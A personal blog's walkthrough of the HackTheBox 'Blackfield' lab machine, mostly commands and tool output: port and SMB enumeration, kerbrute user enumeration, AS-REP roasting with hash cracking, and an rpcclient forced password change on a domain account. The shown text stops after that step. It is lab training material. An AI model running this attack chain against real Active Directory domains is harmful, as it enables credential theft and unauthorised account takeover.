<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>BlackField - HackTheBox | Portfolio, Writeups &amp; Projects</title><meta name="author" content="Faris Mujcinagic"><meta name="copyright" content="Faris Mujcinagic"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Blackfield is a hard difficulty HackTheBox machine, which I have utilized as a part of my prep for the PNPT by TCM Security, as it is Active Directory"><link rel="shortcut icon" href="/Portfolio-Website/img/favicon.png"><link rel="canonical" href="https://fmujcinagic.github.io/Portfolio-Website/2024/08/29/blackfield/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/Portfolio-Website/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/Portfolio-Website/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BlackField - HackTheBox',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-06 15:23:16'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/Portfolio-Website/img/portrait_crop.JPG" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/Portfolio-Website/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/Portfolio-Website/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/Portfolio-Website/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/Portfolio-Website/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/about/"><i class="fa-fw fas fa-folder-open"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/projects/"><i class="fa-fw fas fa-folder-open"></i><span> Projects</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/Portfolio-Website/img/blackfield2.png')"><nav id="nav"><span id="blog-info"><a href="/Portfolio-Website/" title="Portfolio, Writeups &amp; Projects"><span class="site-name">Portfolio, Writeups &amp; Projects</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/Portfolio-Website/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/about/"><i class="fa-fw fas fa-folder-open"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/projects/"><i class="fa-fw fas fa-folder-open"></i><span> Projects</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BlackField - HackTheBox</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-28T22:00:00.000Z" title="Created 2024-08-29 00:00:00">2024-08-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-06T13:23:16.892Z" title="Updated 2024-09-06 15:23:16">2024-09-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/Portfolio-Website/categories/Active-Directory/">Active Directory</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Blackfield is a hard difficulty HackTheBox machine, which I have utilized as a part of my prep for the PNPT by TCM Security, as it is Active Directory focused box.</p>
<h1 id="Short-Summary"><a href="#Short-Summary" class="headerlink" title="Short Summary"></a>Short Summary</h1><p>After quick enumeration, we can find a list of usernames inside of the SMB share, followed by AS-REP-roasting, in order to gain the credentials of <strong>support</strong> account. We move over to Bloodhound enumeration, and we find the interesting ForceChangePassword capability, what leads to finding <code>lssas.DMP</code>. Dumping hashes enables us to connect over WinRM protocol, what reveals the SeBackupPrivilege and SeRestorePrivilege enabled privileges, and these can be very useful in order to read and save variants of SAM and SYSTEM files, followed by <code>ntds.dit</code> . From there we can just pass the hash with evil-winrm and simply get access as administrator.</p>
<h1 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h1><p>We start with scanning all of the ports, which gives us a classic  Windows Domain controller, and we are able to obtain the domain name: <code>blackfield.local</code>. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">sudo</span> nmap -T4 -A -p- 10.10.10.192</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-17 20:47 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> BLACKFIELD.<span class="built_in">local</span> (10.10.10.192)</span><br><span class="line">Host is up (0.052s latency).</span><br><span class="line">Not shown: 65527 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-18 01:49:04Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (88%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (88%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-08-18T01:49:14</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: 7h00m01s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 445/tcp)</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   51.85 ms 10.10.14.1</span><br><span class="line">2   48.26 ms BLACKFIELD.<span class="built_in">local</span> (10.10.10.192)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 152.16 seconds</span><br></pre></td></tr></table></figure>

<p>Additionally, we see that the SMB and WinRM are open, which gives us a good enumeration and attack surface. Let’s check it out.</p>
<aside>
💡 Remember to add the domain name to /etc/hosts.

</aside>

<p>We start with quick run of <code>enum4linux</code> that gives us information that we are allowed to start sessions with an empty username and password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">└─$ enum4linux -U 10.10.10.192                                                  </span><br><span class="line">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Aug 17 21:08:01 2024</span><br><span class="line"></span><br><span class="line"> =========================================( Target Information )=========================================</span><br><span class="line">                                                                                                                                     </span><br><span class="line">Target ........... 10.10.10.192                                                                                                      </span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"> ============================( Enumerating Workgroup/Domain on 10.10.10.192 )============================                                                                                                                              </span><br><span class="line">                                                                                                                                     </span><br><span class="line">[E] Can<span class="string">&#x27;t find workgroup/domain                                                                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                                    </span></span><br><span class="line"><span class="string"> ===================================( Session Check on 10.10.10.192 )===================================                                                                                                                       </span></span><br><span class="line"><span class="string">                                                                                                                                     </span></span><br><span class="line"><span class="string">[+] Server 10.10.10.192 allows sessions using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;                                                               </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string"> ================================( Getting domain SID for 10.10.10.192 )================================</span></span><br><span class="line"><span class="string">                                                                                                                                     </span></span><br><span class="line"><span class="string">Domain Name: BLACKFIELD                                                                                                              </span></span><br><span class="line"><span class="string">Domain Sid: S-1-5-21-4194615774-2175524697-3563712290</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Host is part of a domain (not a workgroup)  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.....</span></span><br></pre></td></tr></table></figure>

<h2 id="SMB-Enumeration-and-Discovery-of-Usernames"><a href="#SMB-Enumeration-and-Discovery-of-Usernames" class="headerlink" title="SMB Enumeration and Discovery of Usernames"></a>SMB Enumeration and Discovery of Usernames</h2><p>As discovered, we will try to list shares at first, and then proceed to experiment with null sessions. Useful resource would be <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html">https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html</a>, that contains the cheat sheet of SMB enumeration, with detailed commands and flags.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient -L \\10.10.10.192 -N       </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        forensic        Disk      Forensic / Audit share.</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        profiles$       Disk      </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<p>From here, <code>forensic</code> and <code>profiles$</code> seem to be interesting. So, we check out <code>forensic</code> share first, but soon we see that it indeed requires privileges, therefore, we try enumerating <code>profiles$</code> .</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient \\\\10.10.10.192\\profiles$</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\kali]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">dir</span></span><br><span class="line">  .                                   D        0  Wed Jun  3 18:47:12 2020</span><br><span class="line">  ..                                  D        0  Wed Jun  3 18:47:12 2020</span><br><span class="line">  AAlleni                             D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  ABarteski                           D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  ABekesz                             D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  ABenzies                            D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AChampken                           D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  ACheretei                           D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  ACsonaki                            D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AHigchens                           D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AJaquemai                           D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AKlado                              D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AKoffenburger                       D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AKollolli                           D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AKruppe                             D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  AKubale                             D        0  Wed Jun  3 18:47:11 2020</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure>

<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a><strong>AS-REP Roasting</strong></h2><p>If we obtain some kind of usernames list in this environment, it would be useful to automatically check for  valid usernames through tool called <code>kerbrute</code>, what would potentially also reveal users whose pre-authentication is disabled, what indicates that those accounts are AS-REP roastable!</p>
<aside>
💡 before executing, we want to strip off necessary information from SMB output, so we either do something like `cat users.txt | awk '{print $1}' > new_users.txt` , or we can manually launch the VS Code and do `ctrl + shift + down arrow` , and then navigate through the list to end up only with usernames.

</aside>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ /opt/kerbrute/kerbrute-linux-amd64 userenum --dc 10.10.10.192 -d blackfield.local users.txt            </span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (n/a) - 08/17/24 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2024/08/17 23:13:39 &gt;  Using KDC(s):</span><br><span class="line">2024/08/17 23:13:39 &gt;   10.10.10.192:88</span><br><span class="line"></span><br><span class="line">2024/08/17 23:14:00 &gt;  [+] VALID USERNAME:       audit2020@blackfield.local</span><br><span class="line">2024/08/17 23:15:53 &gt;  [+] support has no pre auth required. Dumping <span class="built_in">hash</span> to crack offline:</span><br><span class="line">$krb5asrep$18<span class="variable">$support</span>@BLACKFIELD.LOCAL:54ed61d05f51f428d8022cb309cddcf0<span class="variable">$48cf85f08d1b2a5b0e6b126f26e8f2cd2171be9799bddcef425b05c2b91300dd16da56488235a448f59a833be59870fe1885a2a1e41daacdef1af89fa115bf4f1bafa0eca203903f5112f6426477573aab51fccc957a4c3c85a531a8aa3f8d02b2a5e30245105f3e1210174ca6532001676e18d99db26bce3a6f1e6a90d1be9960bd2be904b26e4225d75cb042dadd0abb852df399594ad1fa1d3c79c1478e6c9dc8aa9053df71c858819a7dd731a4db80571d04d04552837ac04cdac30f2eddde3d35c6591de735fc8db00833f584351fcf982d6782efba6191784970fc6f5b4f9ea166f29899c5e404686d6e0e7da978109fee8958de66de98a8ce97d13ae148bb8c2baf878384</span>                                                                 </span><br><span class="line">2024/08/17 23:15:53 &gt;  [+] VALID USERNAME:       support@blackfield.local</span><br><span class="line">2024/08/17 23:15:57 &gt;  [+] VALID USERNAME:       svc_backup@blackfield.local</span><br><span class="line">2024/08/17 23:16:23 &gt;  Done! Tested 314 usernames (3 valid) <span class="keyword">in</span> 163.643 seconds</span><br></pre></td></tr></table></figure>

<p>Nice, we have obtained the hash that could be cracked using the <strong>John the Ripper</strong> or <strong>Hashcat</strong> (module 18200), but I prefer to launch Impacket’s GetNPUsers.py and to specify format hashcat.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ GetNPUsers.py  blackfield.local/ -dc-ip 10.10.10.192 -usersfile users.txt -format hashcat | grep -v <span class="string">&#x27;Kerberos SessionError:&#x27;</span></span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User audit2020 doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$support@BLACKFIELD.LOCAL:95db7ab9f7fc4baf59995b41dcb786e9$3bed44debc6725422033ff312d1c2c56f554a05714b49fe5455e9d949b36aa817ac6c52c076c10671aea738d88b8040229985506c3193746765dd437dc27b38d262b3a917a7935bf07d5608055186c1f0fb3042fbe1cfa126a293572c47f8098dcb9c09d22419ea6d76ec125b61a73a154de706c9ecebd5291099cd34b0132e6690b1653c12b9ba2b10c2090af2f7949c2a36be523a4c7b593d53232ca7a803a9c3aeb121ed115b8ffe8fe0053f72af390c5e42f65b97b2d0c286249b276cfc2b1ea83766d137ebd35117a84d77efaea945f62837f4775bc391fba37a5e284c57c973b33b16456f555169ed55284ffe3b8f7dd0e</span></span><br><span class="line"><span class="string">[-] User svc_backup doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br></pre></td></tr></table></figure>

<p>We can execute <code>hashcat -m 18200 -O hash.txt /usr/share/wordlists/rockyou.txt</code> , where module 18200 is for <em>Kerberos 5, etype 23, AS-REP,</em> and it is recommended to do all of the cracking on the host machine,  since CPU-based cracking on VM is generally slower than GPU-based cracking, especially for complex hashes.</p>
<p><img src="/Portfolio-Website/img/blackfield-image.png" alt="/img/blackfield-image.png"></p>
<h2 id="Initial-Foothold-and-Bloodhound-Enumeration"><a href="#Initial-Foothold-and-Bloodhound-Enumeration" class="headerlink" title="Initial Foothold and Bloodhound Enumeration"></a>Initial Foothold and Bloodhound Enumeration</h2><p>After obtaining credentials of low-privileged user, I’ve tried checking again for SMB Share access to <code>forensic</code> , and also have done check for shell access over port <code>5985</code> , but no luck.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.10.192 -u <span class="string">&#x27;support&#x27;</span> -p <span class="string">&#x27;#00^BlackKnight&#x27;</span>                       </span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.<span class="built_in">local</span>) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.<span class="built_in">local</span>\support:#00^BlackKnight </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">┌──(kali㉿kali)-[~/HTB/blackfield]</span><br><span class="line">└─$ crackmapexec winrm 10.10.10.192 -u <span class="string">&#x27;support&#x27;</span> -p <span class="string">&#x27;#00^BlackKnight&#x27;</span></span><br><span class="line">SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.<span class="built_in">local</span>)</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [-] BLACKFIELD.<span class="built_in">local</span>\support:#00^BlackKnight </span><br></pre></td></tr></table></figure>

<p>It is time to fire up neo4j console, bloodhound GUI and to ingest data using <code>bloodhound-python</code>.</p>
<aside>
💡 If we had a shell, we could transfer SharpHound.exe, which yields in output that can be simply dragged into Bloodhound GUI.

</aside>

<p>After uploading data, all of the JSON files, we can search for our targeted user, <strong><a href="mailto:&#83;&#85;&#x50;&#80;&#x4f;&#x52;&#84;&#64;&#x42;&#76;&#x41;&#67;&#75;&#x46;&#73;&#69;&#x4c;&#68;&#x2e;&#76;&#x4f;&#x43;&#65;&#76;">&#83;&#85;&#x50;&#80;&#x4f;&#x52;&#84;&#64;&#x42;&#76;&#x41;&#67;&#75;&#x46;&#73;&#69;&#x4c;&#68;&#x2e;&#76;&#x4f;&#x43;&#65;&#76;</a></strong>, and look at <code>Node Info</code> from there. There are many things to look at, such as SPN(Service Principal Names), Admin Logons to non-Domain Controllers and so on, but in this case First Degree Object Control, reveals that we are capable of changing <a href="mailto:&#x41;&#85;&#x44;&#73;&#x54;&#x32;&#x30;&#50;&#x30;&#x40;&#66;&#76;&#65;&#67;&#75;&#x46;&#x49;&#x45;&#76;&#68;&#x2e;&#76;&#79;&#x43;&#65;&#76;">&#x41;&#85;&#x44;&#73;&#x54;&#x32;&#x30;&#50;&#x30;&#x40;&#66;&#76;&#65;&#67;&#75;&#x46;&#x49;&#x45;&#76;&#68;&#x2e;&#76;&#79;&#x43;&#65;&#76;</a>‘s password without knowing that user’s current password.</p>
<p><img src="/Portfolio-Website/img/blackfield-image1.png" alt="/img/blackfield-image1.png"></p>
<h2 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h2><p>With a quick Google search, we can out that rpcclient can be utilized to change a password of <code>audit2020</code> , so we can run the following. (Reference:<a target="_blank" rel="noopener" href="https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword">https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword</a> )</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ rpcclient 10.10.10.192 -U <span class="string">&quot;support&quot;</span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\support]:</span><br><span class="line">rpcclient $&gt; setuserinfo2 audit2020 23 faris123.</span><br><span class="line">rpcclient $&gt; </span><br></pre></td></tr></table></figure>

<p>Now lets check again for available options for <code>audit2020</code> . We utilize again crackmapexec checks, but still no luck…</p>
